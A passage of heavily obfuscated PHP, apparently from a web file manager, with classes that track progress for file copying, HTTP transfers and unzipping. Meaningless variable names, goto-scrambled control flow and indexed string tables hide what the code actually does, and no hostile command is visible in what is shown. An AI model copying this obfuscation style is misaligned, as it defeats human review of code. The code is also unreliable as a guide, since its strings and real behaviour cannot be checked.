$D¼ÅèªƒÛğ = PLUGIN_DIR . $d±ğ…œãØê . $b¸ç…øôÚ´[4] . $D¼ÅèªƒÛğ; } else { if (substr($dï™‹ˆÕ›, -5) == $b¸ç…øôÚ´[9]) { $d±ğ…œãØê = substr($e†‹¥‚‘´ï[0], 0, -5); return Model($d±ğ…œãØê); } else { $dğ»ö»¾Ö˜ = $e†‹¥‚‘´ï[0] . $e†‹¥‚‘´ï[1]; $D¼ÅèªƒÛğ = CONTROLLER_DIR . $e†‹¥‚‘´ï[0] . $b¸ç…øôÚ´[4] . $e†‹¥‚‘´ï[1] . $b¸ç…øôÚ´[14]; } } $fÚÛ¬„Æ®ø = strtolower($dğ»ö»¾Ö˜); goto Dò»òÆì¹ß; B•Î‘É¸§: $b¸ç…øôÚ´ =& $_SERVER[¡Áã]; static $b—«ÍâÒÑ = array(); $bÂïƒ“ˆÑ = $d±ğ…œãØê; goto dº—ãˆË¨í; a‘â–ğÓâˆ: } function ActionApply($DùºÉãé£Ë, $F £­“á¡ = array()) { goto FËøƒ¸µØÆ; fŠ®‚°Ï: $d»¾æ‡Íç = substr($DùºÉãé£Ë, 0, $AÇÍÜ¿¯ã¡); $cÛ£—Ñ¬çô = substr($DùºÉãé£Ë, $AÇÍÜ¿¯ã¡ + 1); $A“…õâó = Action($d»¾æ‡Íç); goto c—µ„ÁÉæ; FËøƒ¸µØÆ: if (is_array($DùºÉãé£Ë)) { return call_user_func_array($DùºÉãé£Ë, $F £­“á¡); } if (function_exists($DùºÉãé£Ë)) { return call_user_func_array($DùºÉãé£Ë, $F £­“á¡); } $AÇÍÜ¿¯ã¡ = strrpos($DùºÉãé£Ë, $_SERVER[¡Áã][5]); goto fŠ®‚°Ï; c—µ„ÁÉæ: if (!method_exists($A“…õâó, $cÛ£—Ñ¬çô)) { return actionCallError("{$DùºÉãé£Ë}\x20\x6d\x65\x74\150\x6f\144\40\x6e\157\164\x20\145\170\x69\x73\164\x73\x21"); } $Dà¢µ¡Ñô = call_user_func_array(array($A“…õâó, $cÛ£—Ñ¬çô), $F £­“á¡); return $Dà¢µ¡Ñô; goto C…Ù¼™¨™; C…Ù¼™¨™: } function actionCallError($fÉãÂ—«æÜ) { return write_log($fÉãÂ—«æÜ, $_SERVER[¡Áã][15]); } goto E¸ÄëÆ…²; e‹Êç¹Ó·À: class TaskFileTransfer extends Task { protected function startAfter() { goto cÒªÔñ‚¯; A’äå‹‰¦‰: Hook::bind($Cç¯ÙŸÛÃŠ[1474], array($this, $Cç¯ÙŸÛÃŠ[1475])); Hook::bind($Cç¯ÙŸÛÃŠ[1476], array($this, $Cç¯ÙŸÛÃŠ[1477])); Hook::bind($Cç¯ÙŸÛÃŠ[1478], array($this, $Cç¯ÙŸÛÃŠ[1479])); goto C™«¹ğ›‰ˆ; A™Ó¢”›¦²: Hook::bind($Cç¯ÙŸÛÃŠ[545], array($this, $Cç¯ÙŸÛÃŠ[1469])); Hook::bind($Cç¯ÙŸÛÃŠ[511], array($this, $Cç¯ÙŸÛÃŠ[1470])); Hook::bind($Cç¯ÙŸÛÃŠ[508], array($this, $Cç¯ÙŸÛÃŠ[1470])); goto aâ—éÏÌ‡ç; EÈæÍö±…Š: $b„«¹‡§î[$Cç¯ÙŸÛÃŠ[975]] = $Cç¯ÙŸÛÃŠ[33]; $b„«¹‡§î[$Cç¯ÙŸÛÃŠ[1484]] = $Cç¯ÙŸÛÃŠ[33]; $b„«¹‡§î[$Cç¯ÙŸÛÃŠ[1485]] = 0; goto eŒäõÎÀİß; BŸ÷•³æ©‹: Hook::bind($Cç¯ÙŸÛÃŠ[1471], array($this, $Cç¯ÙŸÛÃŠ[1472])); Hook::bind($Cç¯ÙŸÛÃŠ[534], array($this, $Cç¯ÙŸÛÃŠ[1473])); $this->sourceModelCopyFlag = !1; goto A’äå‹‰¦‰; f’‹ŠáïË: Hook::bind($Cç¯ÙŸÛÃŠ[541], array($this, $Cç¯ÙŸÛÃŠ[1467])); Hook::bind($Cç¯ÙŸÛÃŠ[542], array($this, $Cç¯ÙŸÛÃŠ[1468])); Hook::bind($Cç¯ÙŸÛÃŠ[544], array($this, $Cç¯ÙŸÛÃŠ[1469])); goto A™Ó¢”›¦²; aâ—éÏÌ‡ç: Hook::bind($Cç¯ÙŸÛÃŠ[513], array($this, $Cç¯ÙŸÛÃŠ[1470])); Hook::bind($Cç¯ÙŸÛÃŠ[515], array($this, $Cç¯ÙŸÛÃŠ[1470])); Hook::bind($Cç¯ÙŸÛÃŠ[517], array($this, $Cç¯ÙŸÛÃŠ[1470])); goto BŸ÷•³æ©‹; Dù±äÍ¸ä¯: Hook::bind($Cç¯ÙŸÛÃŠ[1461], array($this, $Cç¯ÙŸÛÃŠ[1462])); Hook::bind($Cç¯ÙŸÛÃŠ[1463], array($this, $Cç¯ÙŸÛÃŠ[1464])); Hook::bind($Cç¯ÙŸÛÃŠ[1465], array($this, $Cç¯ÙŸÛÃŠ[1466])); goto f’‹ŠáïË; cÒªÔñ‚¯: $Cç¯ÙŸÛÃŠ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b„«¹‡§î =& $this->task; $this->sourceCopyFolder = !1; goto Dù±äÍ¸ä¯; C™«¹ğ›‰ˆ: $b„«¹‡§î[$Cç¯ÙŸÛÃŠ[1480]] = LNG($Cç¯ÙŸÛÃŠ[1481]); $b„«¹‡§î[$Cç¯ÙŸÛÃŠ[1482]] = 0; $b„«¹‡§î[$Cç¯ÙŸÛÃŠ[1483]] = 0; goto EÈæÍö±…Š; eŒäõÎÀİß: $b„«¹‡§î[$Cç¯ÙŸÛÃŠ[1486]] = 0; $b„«¹‡§î[$Cç¯ÙŸÛÃŠ[1487]] = 0; if (!$b„«¹‡§î[$Cç¯ÙŸÛÃŠ[1343]]) { $b„«¹‡§î[$Cç¯ÙŸÛÃŠ[1343]] = LNG($Cç¯ÙŸÛÃŠ[1488]); } goto B´«¡’¦Ìø; B´«¡’¦Ìø: } protected function endAfter() { goto dêÇå‰†àÒ; dêÇå‰†àÒ: $CÖ²¢£íËá =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; Hook::unbind($CÖ²¢£íËá[1461], array($this, $CÖ²¢£íËá[1462])); Hook::unbind($CÖ²¢£íËá[1463], array($this, $CÖ²¢£íËá[1464])); goto BÊ¤£ƒùÕå; d‰‡”Ûº³§: Hook::unbind($CÖ²¢£íËá[508], array($this, $CÖ²¢£íËá[1470])); Hook::unbind($CÖ²¢£íËá[513], array($this, $CÖ²¢£íËá[1470])); Hook::unbind($CÖ²¢£íËá[515], array($this, $CÖ²¢£íËá[1470])); goto EÚ©ŸÛø‡‚; dª°ŸäÀ¦: Hook::unbind($CÖ²¢£íËá[1474], array($this, $CÖ²¢£íËá[1475])); Hook::unbind($CÖ²¢£íËá[1476], array($this, $CÖ²¢£íËá[1477])); Hook::unbind($CÖ²¢£íËá[1478], array($this, $CÖ²¢£íËá[1479])); goto Fí´Á®œˆ¹; EÚ©ŸÛø‡‚: Hook::unbind($CÖ²¢£íËá[517], array($this, $CÖ²¢£íËá[1470])); Hook::unbind($CÖ²¢£íËá[1471], array($this, $CÖ²¢£íËá[1472])); Hook::unbind($CÖ²¢£íËá[534], array($this, $CÖ²¢£íËá[1473])); goto dª°ŸäÀ¦; DÔÁàë‡: Hook::unbind($CÖ²¢£íËá[544], array($this, $CÖ²¢£íËá[1469])); Hook::unbind($CÖ²¢£íËá[545], array($this, $CÖ²¢£íËá[1469])); Hook::unbind($CÖ²¢£íËá[511], array($this, $CÖ²¢£íËá[1470])); goto d‰‡”Ûº³§; BÊ¤£ƒùÕå: Hook::unbind($CÖ²¢£íËá[1465], array($this, $CÖ²¢£íËá[1466])); Hook::unbind($CÖ²¢£íËá[541], array($this, $CÖ²¢£íËá[1467])); Hook::unbind($CÖ²¢£íËá[542], array($this, $CÖ²¢£íËá[1468])); goto DÔÁàë‡; Fí´Á®œˆ¹: } public function copyMoveStart($E’ì½ŒäÉ, $få¶ö•Ğª, $cÜ·ÂœÄĞë, $dôËµË±¯’) { goto cí­ñµ‡’á; cí­ñµ‡’á: $DäáŸ¦•ª© =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::log($DäáŸ¦•ª©[1489] . $få¶ö•Ğª . $DäáŸ¦•ª©[66] . $dôËµË±¯’); $f’†Ãí“²‹ = rtrim(TEMP_FILES, $DäáŸ¦•ª©[8]); goto A¤²„¢”†Í; A¤²„¢”†Í: if (substr($få¶ö•Ğª, 0, strlen($f’†Ãí“²‹)) == $f’†Ãí“²‹) { return; } if (substr($dôËµË±¯’, 0, strlen($f’†Ãí“²‹)) == $f’†Ãí“²‹) { return; } $e¨Í‚Ê‘–ƒ =& $this->task; goto F„«âª¸äƒ; F„«âª¸äƒ: $e¨Í‚Ê‘–ƒ[$DäáŸ¦•ª©[1490]] = KodIO::transferType($E’ì½ŒäÉ, $cÜ·ÂœÄĞë); $this->update(); goto b÷Èâƒ¬µ±; b÷Èâƒ¬µ±: } public function updateAfter() { goto DèŒ±Ÿ›£Á; Bäé°‹ƒàÍ: $eä‡Û¨»ª¡[$A¯¯³„æèº[1438]] = $eä‡Û¨»ª¡[$A¯¯³„æèº[1487]] / $eä‡Û¨»ª¡[$A¯¯³„æèº[692]]; if ($eä‡Û¨»ª¡[$A¯¯³„æèº[1438]] > 0) { $Cßæ§Ñ»Şß = timeFloat() - $eä‡Û¨»ª¡[$A¯¯³„æèº[1440]] - $eä‡Û¨»ª¡[$A¯¯³„æèº[1443]]; $eä‡Û¨»ª¡[$A¯¯³„æèº[1444]] = $Cßæ§Ñ»Şß * (1 - $eä‡Û¨»ª¡[$A¯¯³„æèº[1438]]) / $eä‡Û¨»ª¡[$A¯¯³„æèº[1438]]; } goto a‹›´ñ°Á°; DèŒ±Ÿ›£Á: $A¯¯³„æèº =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eä‡Û¨»ª¡ =& $this->task; if (!$eä‡Û¨»ª¡[$A¯¯³„æèº[692]]) { return; } goto F¨‹ªÊ“Ûñ; F¨‹ªÊ“Ûñ: if ($this->sourceModelCopyFlag) { return; } if ($eä‡Û¨»ª¡[$A¯¯³„æèº[1490]] == $A¯¯³„æèº[1091]) { return; } if ($eä‡Û¨»ª¡[$A¯¯³„æèº[1490]] == $A¯¯³„æèº[1037] || $eä‡Û¨»ª¡[$A¯¯³„æèº[1490]] == $A¯¯³„æèº[103]) { if ($eä‡Û¨»ª¡[$A¯¯³„æèº[1484]]) { $eä‡Û¨»ª¡[$A¯¯³„æèº[1487]] = $eä‡Û¨»ª¡[$A¯¯³„æèº[1486]] + $eä‡Û¨»ª¡[$A¯¯³„æèº[1483]]; } } else { if ($eä‡Û¨»ª¡[$A¯¯³„æèº[1490]] == $A¯¯³„æèº[1092]) { if ($eä‡Û¨»ª¡[$A¯¯³„æèº[1484]] == $A¯¯³„æèº[1037]) { $eä‡Û¨»ª¡[$A¯¯³„æèº[1487]] = $eä‡Û¨»ª¡[$A¯¯³„æèº[1486]] + $eä‡Û¨»ª¡[$A¯¯³„æèº[1483]] * 0.5; } else { if ($eä‡Û¨»ª¡[$A¯¯³„æèº[1484]] == $A¯¯³„æèº[103]) { $eä‡Û¨»ª¡[$A¯¯³„æèº[1487]] = $eä‡Û¨»ª¡[$A¯¯³„æèº[1486]] + $eä‡Û¨»ª¡[$A¯¯³„æèº[1482]] * 0.5 + $eä‡Û¨»ª¡[$A¯¯³„æèº[1483]] * 0.5; } } } } goto Bäé°‹ƒàÍ; a‹›´ñ°Á°: } public function addPath($CÊô¹¿Ï‹) { goto EÉ®ËŒğ¤¨; AºÈÕ¾ğàÌ: $Eœ‡¨¥Ò¥¬ = IO::infoWithChildren($CÊô¹¿Ï‹); $B¥ØåŸë¥ = $a‹·‡İƒ¨[$F˜‹Œ’®ªö[1491]] ? $a‹·‡İƒ¨[$F˜‹Œ’®ªö[1491]][$F˜‹Œ’®ªö[1492]] : 0; $a‹·‡İƒ¨[$F˜‹Œ’®ªö[1491]] = array($F˜‹Œ’®ªö[1492] => $B¥ØåŸë¥ + 1, $F˜‹Œ’®ªö[386] => $Eœ‡¨¥Ò¥¬[$F˜‹Œ’®ªö[28]], $F˜‹Œ’®ªö[75] => $Eœ‡¨¥Ò¥¬[$F˜‹Œ’®ªö[75]], $F˜‹Œ’®ªö[468] => $Eœ‡¨¥Ò¥¬[$F˜‹Œ’®ªö[468]] ? $Eœ‡¨¥Ò¥¬[$F˜‹Œ’®ªö[468]] : $Eœ‡¨¥Ò¥¬[$F˜‹Œ’®ªö[75]]); goto eØöáÀºÙ…; EÉ®ËŒğ¤¨: $F˜‹Œ’®ªö =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$CÊô¹¿Ï‹) { return; } $a‹·‡İƒ¨ =& $this->task; goto AºÈÕ¾ğàÌ; eØöáÀºÙ…: if ($Eœ‡¨¥Ò¥¬[$F˜‹Œ’®ªö[29]] == $F˜‹Œ’®ªö[167]) { $a‹·‡İƒ¨[$F˜‹Œ’®ªö[973]] += 1; } else { $a‹·‡İƒ¨[$F˜‹Œ’®ªö[973]] += $Eœ‡¨¥Ò¥¬[$F˜‹Œ’®ªö[80]][$F˜‹Œ’®ªö[78]]; if ($Eœ‡¨¥Ò¥¬[$F˜‹Œ’®ªö[369]]) { $a‹·‡İƒ¨[$F˜‹Œ’®ªö[973]] += $Eœ‡¨¥Ò¥¬[$F˜‹Œ’®ªö[80]][$F˜‹Œ’®ªö[79]] + 1; } } $a‹·‡İƒ¨[$F˜‹Œ’®ªö[692]] += $Eœ‡¨¥Ò¥¬[$F˜‹Œ’®ªö[77]]; $this->update(); goto döŞ©„ƒ¾‰; döŞ©„ƒ¾‰: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($fßÚæöæŞ) { $bùŸ²³‡–í =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F¬ÔÃ¸—Ö± =& $this->task; $F¬ÔÃ¸—Ö±[$bùŸ²³‡–í[1480]] = $fßÚæöæŞ[$bùŸ²³‡–í[28]]; $F¬ÔÃ¸—Ö±[$bùŸ²³‡–í[975]] = $fßÚæöæŞ[$bùŸ²³‡–í[28]]; $this->update(); } public function copyFileStart($cß—ßƒœ¿Ñ, $Bİ¯‡´Š„µ, $bÂÔÛÈÆ´Ä, $cíš†ˆ¤, $bñç¹ŒÈ–‹, $c¡·á¦Ñƒµ) { goto fÍÕìÇÁˆ«; A’ÜÕ‘¦ù·: $this->update(); goto B­µ­›ø†; F¯ÜÁóä†é: $CÏ±®çºÃ[$Càñ¢‹¯¤­[975]] = $Càñ¢‹¯¤­[33]; $CÏ±®çºÃ[$Càñ¢‹¯¤­[1484]] = $Càñ¢‹¯¤­[33]; $CÏ±®çºÃ[$Càñ¢‹¯¤­[1485]] = 0; goto A’ÜÕ‘¦ù·; fÍÕìÇÁˆ«: $Càñ¢‹¯¤­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aĞ“î©Ì·¥ = $bñç¹ŒÈ–‹; if ($aĞ“î©Ì·¥ == $GLOBALS[$Càñ¢‹¯¤­[1493]]) { $aĞ“î©Ì·¥ = $GLOBALS[$Càñ¢‹¯¤­[1494]]; } goto FÕğã™ã¶; FÕğã™ã¶: $GLOBALS[$Càñ¢‹¯¤­[1494]] = $bñç¹ŒÈ–‹; $GLOBALS[$Càñ¢‹¯¤­[1493]] = $c¡·á¦Ñƒµ; $CÏ±®çºÃ =& $this->task; goto E¸ß÷Ÿõ¤; E¸ß÷Ÿõ¤: $CÏ±®çºÃ[$Càñ¢‹¯¤­[1480]] = $aĞ“î©Ì·¥; $CÏ±®çºÃ[$Càñ¢‹¯¤­[1482]] = (int) $cß—ßƒœ¿Ñ->size($Bİ¯‡´Š„µ); $CÏ±®çºÃ[$Càñ¢‹¯¤­[1483]] = 0; goto F¯ÜÁóä†é; B­µ­›ø†: } public function copyFileEnd($a³§Œ¶ŸÈ, $C£¬ÖÇ«³, $D¦ƒ‰®·â¥, $bÇîº¸Éåœ, $Dİ‘ƒë™ä°, $C†Î‹›µ¶) { $F›×ñ‡‡½ä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E’Ä…ØÉ =& $this->task; $E’Ä…ØÉ[$F›×ñ‡‡½ä[1483]] = $E’Ä…ØÉ[$F›×ñ‡‡½ä[1482]]; $E’Ä…ØÉ[$F›×ñ‡‡½ä[1484]] = $F›×ñ‡‡½ä[33]; if ($Dİ‘ƒë™ä° == $E’Ä…ØÉ[$F›×ñ‡‡½ä[1480]]) { $E’Ä…ØÉ[$F›×ñ‡‡½ä[1486]] += $E’Ä…ØÉ[$F›×ñ‡‡½ä[1482]]; $E’Ä…ØÉ[$F›×ñ‡‡½ä[1487]] = $E’Ä…ØÉ[$F›×ñ‡‡½ä[1486]]; $this->update(1); } else { $this->update(); $E’Ä…ØÉ[$F›×ñ‡‡½ä[1483]] = 0; } self::log($F›×ñ‡‡½ä[1495] . $C£¬ÖÇ«³ . $F›×ñ‡‡½ä[66] . $bÇîº¸Éåœ . $F›×ñ‡‡½ä[217] . $Dİ‘ƒë™ä° . $F›×ñ‡‡½ä[1496] . $E’Ä…ØÉ[$F›×ñ‡‡½ä[1480]]); } public function updateFileEnd($AÓ“¨¦È†Î, $BÈÆ¤Óˆš) { goto bŞİ‰ßÊÛ; bŞİ‰ßÊÛ: $c†«÷ÏŸëÀ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A›œ†Š¦ =& $this->task; $A›œ†Š¦[$c†«÷ÏŸëÀ[1480]] = $AÓ“¨¦È†Î; goto Bï¹Æš“Õ; bˆ¬¤ÉŸ: $this->update(1); self::log($c†«÷ÏŸëÀ[1497] . $AÓ“¨¦È†Î); goto Dêº®½¾ğ; Bï¹Æš“Õ: $A›œ†Š¦[$c†«÷ÏŸëÀ[1482]] = $BÈÆ¤Óˆš; $A›œ†Š¦[$c†«÷ÏŸëÀ[1486]] += $BÈÆ¤Óˆš; $A›œ†Š¦[$c†«÷ÏŸëÀ[1487]] = $A›œ†Š¦[$c†«÷ÏŸëÀ[1486]]; goto bˆ¬¤ÉŸ; Dêº®½¾ğ: } public function sourceModelCopy($C•Ç´¯¬ô») { goto d²»Ğ£êöë; d²»Ğ£êöë: $b·õôÑ‰„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c²½©†»Í = $C•Ç´¯¬ô»[0]; $fÏ¸ğæÅçä = $C•Ç´¯¬ô»[1]; goto AÓ©£“ ’¼; AÓ©£“ ’¼: $B¨ßºØ‰„ =& $this->task; $this->sourceModelCopyFlag = !0; $cÉîÍÆËœ¤ = 0; goto A†˜ßÖ‘ÀË; A†˜ßÖ‘ÀË: switch ($c²½©†»Í) { case $b·õôÑ‰„[509]: $cÉîÍÆËœ¤ = 1; break; case $b·õôÑ‰„[512]: $B¨ßºØ‰„[$b·õôÑ‰„[1480]] = $fÏ¸ğæÅçä[$b·õôÑ‰„[28]]; break; case $b·õôÑ‰„[514]: $cÉîÍÆËœ¤ = intval($C•Ç´¯¬ô»[$b·õôÑ‰„[363]] * 0.4); break; case $b·õôÑ‰„[516]: $cÉîÍÆËœ¤ = intval($C•Ç´¯¬ô»[$b·õôÑ‰„[363]] * 0.2); break; case $b·õôÑ‰„[518]: $cÉîÍÆËœ¤ = intval($C•Ç´¯¬ô»[$b·õôÑ‰„[363]] * 0.4); break; } $this->update($cÉîÍÆËœ¤); $this->sourceModelCopyFlag = !1; goto CŸ¹Ã‹«Ÿ; CŸ¹Ã‹«Ÿ: } public function sourceRemove($a±²±Å‹Õ, $f“Â¿ƒ¢›Ü) { $Fšñø‹›íè =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->sourceModelCopyFlag = !0; $c‹¯öÖÛˆ = 1; if (isset($a±²±Å‹Õ[$Fšñø‹›íè[80]])) { $c‹¯öÖÛˆ = $a±²±Å‹Õ[$Fšñø‹›íè[80]][$Fšñø‹›íè[78]] + $a±²±Å‹Õ[$Fšñø‹›íè[80]][$Fšñø‹›íè[79]] + 1; } $this->update($c‹¯öÖÛˆ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Déˆ·Ñ†‘È) { $this->sourceRemove($Déˆ·Ñ†‘È, !1); } public function curlProgress($d»Ì…´½…÷, $e¦…œ¬éö¬, $B”¶ùîÕô, $fîÚÉÚÃÓ, $D¦¶ÇğôãĞ) { $A‚Ì­†ë¾Á =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a˜§Ñ´²¶ =& $this->task; if ($D¦¶ÇğôãĞ > 0) { $a˜§Ñ´²¶[$A‚Ì­†ë¾Á[975]] = $A‚Ì­†ë¾Á[1498]; $a˜§Ñ´²¶[$A‚Ì­†ë¾Á[1484]] = $A‚Ì­†ë¾Á[103]; if ($a˜§Ñ´²¶[$A‚Ì­†ë¾Á[1482]] == $fîÚÉÚÃÓ || $fîÚÉÚÃÓ > 1024 * 1024) { $a˜§Ñ´²¶[$A‚Ì­†ë¾Á[1483]] = $D¦¶ÇğôãĞ; } if ($a˜§Ñ´²¶[$A‚Ì­†ë¾Á[1485]]) { $a˜§Ñ´²¶[$A‚Ì­†ë¾Á[1483]] = $D¦¶ÇğôãĞ + $a˜§Ñ´²¶[$A‚Ì­†ë¾Á[1485]]; } } else { if ($B”¶ùîÕô > 0) { if ($a˜§Ñ´²¶[$A‚Ì­†ë¾Á[1482]] == $e¦…œ¬éö¬) { $a˜§Ñ´²¶[$A‚Ì­†ë¾Á[1483]] = $B”¶ùîÕô; $a˜§Ñ´²¶[$A‚Ì­†ë¾Á[975]] = $A‚Ì­†ë¾Á[1499]; $a˜§Ñ´²¶[$A‚Ì­†ë¾Á[1484]] = $A‚Ì­†ë¾Á[1037]; } } } $this->update(); } public function curlProgressStart($DÀèååóùÍ) { } public function curlProgressEnd($fòâè¼ ò) { $aÉŞ„è¦îÃ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C‘·ğ¿  =& $this->task; $C°Û‘¦˜ïÄ = curl_getinfo($fòâè¼ ò); $f†¥ÖÚ† = $C°Û‘¦˜ïÄ[$aÉŞ„è¦îÃ[1500]]; if ($C‘·ğ¿ [$aÉŞ„è¦îÃ[1484]] == $aÉŞ„è¦îÃ[103] && $f†¥ÖÚ†) { $C‘·ğ¿ [$aÉŞ„è¦îÃ[1485]] += $f†¥ÖÚ†; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $cÀõÕ‡îçº =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bÍ³’¥±‡« =& $this->task; $bÍ³’¥±‡«[$cÀõÕ‡îçº[1501]] = 1; Hook::bind($cÀõÕ‡îçº[1474], array($this, $cÀõÕ‡îçº[1502])); Hook::bind($cÀõÕ‡îçº[1476], array($this, $cÀõÕ‡îçº[1503])); Hook::bind($cÀõÕ‡îçº[1478], array($this, $cÀõÕ‡îçº[1504])); } protected function endAfter() { $cÛ¸Ø×”Ú =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; Hook::unbind($cÛ¸Ø×”Ú[1474], array($this, $cÛ¸Ø×”Ú[1502])); Hook::unbind($cÛ¸Ø×”Ú[1476], array($this, $cÛ¸Ø×”Ú[1503])); Hook::unbind($cÛ¸Ø×”Ú[1478], array($this, $cÛ¸Ø×”Ú[1504])); } public function progressStart($e¨…„ÙÖ†ˆ) { $eÊğœğÔ× =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÜ‚«ˆ°Ôœ = curl_getinfo($e¨…„ÙÖ†ˆ); self::log($eÊğœğÔ×[1505] . $dÜ‚«ˆ°Ôœ[$eÊğœğÔ×[295]]); self::valueSet($this->task[$eÊğœğÔ×[367]], $this->task); } public function progressEnd($Cì¥´Í´¼¬) { $bëÈˆïÊŠ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::log($bëÈˆïÊŠ[1506] . $this->task[$bëÈˆïÊŠ[367]]); $this->end(); } public function progress($e±Üä°İ, $C‡İ–Ö‘Ôª, $E§–õ…èÄ‰, $CèÇÑ‰’Â, $CŠ­½™µ‡) { $D ÌåÔÄ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $câÊ¹éëé =& $this->task; if ($CŠ­½™µ‡ > 0) { $câÊ¹éëé[$D ÌåÔÄ[973]] = $câÊ¹éëé[$D ÌåÔÄ[973]] == 0 ? $CèÇÑ‰’Â : $câÊ¹éëé[$D ÌåÔÄ[973]]; $câÊ¹éëé[$D ÌåÔÄ[987]] = $CŠ­½™µ‡; } else { if ($E§–õ…èÄ‰ > 0) { $câÊ¹éëé[$D ÌåÔÄ[973]] = $câÊ¹éëé[$D ÌåÔÄ[973]] == 0 ? $C‡İ–Ö‘Ôª : $câÊ¹éëé[$D ÌåÔÄ[973]]; $câÊ¹éëé[$D ÌåÔÄ[987]] = $E§–õ…èÄ‰; } } $this->update(); self::log("\160\162\x6f\147\162\x65\163\163\110\164\x74\x70\72\144\157\167\156\72{$E§–õ…èÄ‰}\57{$C‡İ–Ö‘Ôª}\x3b\x20\165\x70\x6c\x6f\141\x64\72{$CŠ­½™µ‡}\57{$CèÇÑ‰’Â}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto D¬¤âõ­é–; bÏ°Ë·ëµÍ: if (!$B·å«Ÿµ†[$EÑîãƒ¶ã[1343]]) { $B·å«Ÿµ†[$EÑîãƒ¶ã[1343]] = LNG($EÑîãƒ¶ã[1511]); } goto DÊìÀŒó¿ï; B½ä”Î‹’´: Hook::bind($EÑîãƒ¶ã[1032], array($this, $EÑîãƒ¶ã[1509])); $B·å«Ÿµ† =& $this->task; $B·å«Ÿµ†[$EÑîãƒ¶ã[1510]] = $EÑîãƒ¶ã[1037]; goto bÏ°Ë·ëµÍ; D¬¤âõ­é–: $EÑîãƒ¶ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; parent::startAfter(); Hook::bind($EÑîãƒ¶ã[1507], array($this, $EÑîãƒ¶ã[1508])); goto B½ä”Î‹’´; DÊìÀŒó¿ï: } protected function endAfter() { $EÊóŸÓ“±Ñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; parent::endAfter(); Hook::unbind($EÊóŸÓ“±Ñ[1507], array($this, $EÊóŸÓ“±Ñ[1508])); Hook::unbind($EÊóŸÓ“±Ñ[1032], array($this, $EÊóŸÓ“±Ñ[1509])); } public function updateAfter() { $bæ‰íŞÊ ó =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b“ÇİçÎ½ =& $this->task; if (!$b“ÇİçÎ½[$bæ‰íŞÊ ó[973]] || !$b“ÇİçÎ½[$bæ‰íŞÊ ó[692]]) { return; } if ($b“ÇİçÎ½[$bæ‰íŞÊ ó[1510]] == $bæ‰íŞÊ ó[1037]) { $A¶ºó‘îèä = 0; if ($b“ÇİçÎ½[$bæ‰íŞÊ ó[1482]]) { $A¶ºó‘îèä = $b“ÇİçÎ½[$bæ‰íŞÊ ó[1483]] / $b“ÇİçÎ½[$bæ‰íŞÊ ó[1482]]; } $b“ÇİçÎ½[$bæ‰íŞÊ ó[1438]] = $A¶ºó‘îèä * 0.3; } else { if ($b“ÇİçÎ½[$bæ‰íŞÊ ó[1510]] == $bæ‰íŞÊ ó[301]) { $A¶ºó‘îèä = $b“ÇİçÎ½[$bæ‰íŞÊ ó[987]] / $b“ÇİçÎ½[$bæ‰íŞÊ ó[973]]; $b“ÇİçÎ½[$bæ‰íŞÊ ó[1438]] = 0.3 + $A¶ºó‘îèä * 0.4; } else { if ($b“ÇİçÎ½[$bæ‰íŞÊ ó[1510]] == $bæ‰íŞÊ ó[103]) { $CÓ·®„ì = 0; if ($b“ÇİçÎ½[$bæ‰íŞÊ ó[1484]] == $bæ‰íŞÊ ó[103]) { $CÓ·®„ì = $b“ÇİçÎ½[$bæ‰íŞÊ ó[1483]]; } $A¶ºó‘îèä = ($b“ÇİçÎ½[$bæ‰íŞÊ ó[1487]] + $CÓ·®„ì) / $b“ÇİçÎ½[$bæ‰íŞÊ ó[692]]; $b“ÇİçÎ½[$bæ‰íŞÊ ó[1438]] = 0.3 + 0.4 + $A¶ºó‘îèä * 0.3; } } } if ($b“ÇİçÎ½[$bæ‰íŞÊ ó[1438]] > 0) { $B‚ò¯¦Œç = timeFloat() - $b“ÇİçÎ½[$bæ‰íŞÊ ó[1440]] - $b“ÇİçÎ½[$bæ‰íŞÊ ó[1443]]; $b“ÇİçÎ½[$bæ‰íŞÊ ó[1444]] = $B‚ò¯¦Œç * (1 - $b“ÇİçÎ½[$bæ‰íŞÊ ó[1438]]) / $b“ÇİçÎ½[$bæ‰íŞÊ ó[1438]]; } } public function addFile($DÂˆî‡ğù) { goto A¶çø·Æá¼; E²ñ¥î¯ãÎ: $c˜Œ›´øŠ[$C²£•’µ[975]] = $C²£•’µ[1499]; $c˜Œ›´øŠ[$C²£•’µ[1484]] = $C²£•’µ[1037]; $c˜Œ›´øŠ[$C²£•’µ[692]] = $e“›¬èšŠÊ[$C²£•’µ[77]]; goto a¨Ç½ç»; a¨Ç½ç»: $c˜Œ›´øŠ[$C²£•’µ[973]] = 1; $B×†òÆÙİ… = 0; $c˜Œ›´øŠ[$C²£•’µ[1491]] = array($C²£•’µ[1492] => $B×†òÆÙİ… + 1, $C²£•’µ[386] => $e“›¬èšŠÊ[$C²£•’µ[28]], $C²£•’µ[75] => $e“›¬èšŠÊ[$C²£•’µ[75]], $C²£•’µ[468] => $e“›¬èšŠÊ[$C²£•’µ[468]] ? 